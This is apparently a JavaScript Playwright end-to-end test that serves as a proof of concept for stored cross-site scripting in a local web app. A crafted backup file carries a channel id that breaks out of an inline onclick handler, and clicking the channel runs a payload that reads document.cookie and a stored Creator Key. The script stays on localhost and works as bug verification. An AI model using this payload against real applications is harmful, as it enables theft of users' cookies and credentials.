import { open, report } from "./drive.mjs";
// End-to-end: a backup file one person hands another (the documented Presets &
// Backup flow) carries a channel whose id breaks out of the inline handler.
const PAY = '"); window.__pwned = document.cookie + "|" + localStorage.getItem("myListAddon:creatorKey"); //';
const { browser, page, logs } = await open();
await page.route("**/*", r => r.request().url().startsWith("http://127.0.0.1:8787") ? r.continue() : r.abort());
page.on("dialog", d => d.dismiss().catch(()=>{}));
await page.goto("http://127.0.0.1:8787/", { waitUntil: "domcontentloaded", timeout: 45000 });
await page.waitForTimeout(2500);
// victim is a signed-in user with a Creator Key in localStorage
await page.evaluate(() => { localStorage.setItem("myListAddon:creatorKey", "MYL-VICT-IMSK-EY01"); window.__pwned = null; });

const hostileBackup = {
  version: "3.0",
  entries: [],
  channels: { [PAY]: { channelId: PAY, name: "Cool Sci-Fi Channel", type: "series",
    items: [{ id: "tt0944947", type: "series", name: "Ep", showName: "S", seasonNum: 1, episodeNum: 1 }] } },
};
await page.evaluate((b) => { document.getElementById("configJsonBox").value = JSON.stringify(b); importConfigJson(); }, hostileBackup);
await page.waitForTimeout(1500);
await page.evaluate(()=>closeModal());
console.log("restore stored channel ids:", await page.evaluate(()=>Object.keys(JSON.parse(localStorage.getItem("myListAddon:localChannels")||"{}"))));

await page.click('[data-tab="channels"]');
await page.waitForTimeout(1500);
await page.click('#channelsSubnavBar [data-sub="my-channels"]').catch(()=>{});
await page.waitForTimeout(2000);
const handlers = await page.evaluate(() => [...document.querySelectorAll("[onclick]")]
  .map(e=>e.getAttribute("onclick")).filter(a=>a.includes("__pwned")).slice(0,3));
console.log("\ninline handlers generated from the imported id:");
handlers.forEach(h=>console.log("   ", h.slice(0,150)));
// the victim clicks their own channel card -- an entirely ordinary action
const clicked = await page.evaluate(() => {
  const el = [...document.querySelectorAll("[onclick]")].find(e => e.getAttribute("onclick").includes("__pwned"));
  if (!el) return false; el.click(); return true;
});
await page.waitForTimeout(800);
const pwned = await page.evaluate(()=>window.__pwned);
console.log("\nvictim clicked their channel:", clicked);
console.log("window.__pwned =", JSON.stringify(pwned));
console.log(pwned ? "\n*** CONFIRMED STORED XSS: imported data executed script and read the victim's Creator Key ***" : "\nnot exploited");
report(logs, "xss e2e");
await browser.close();
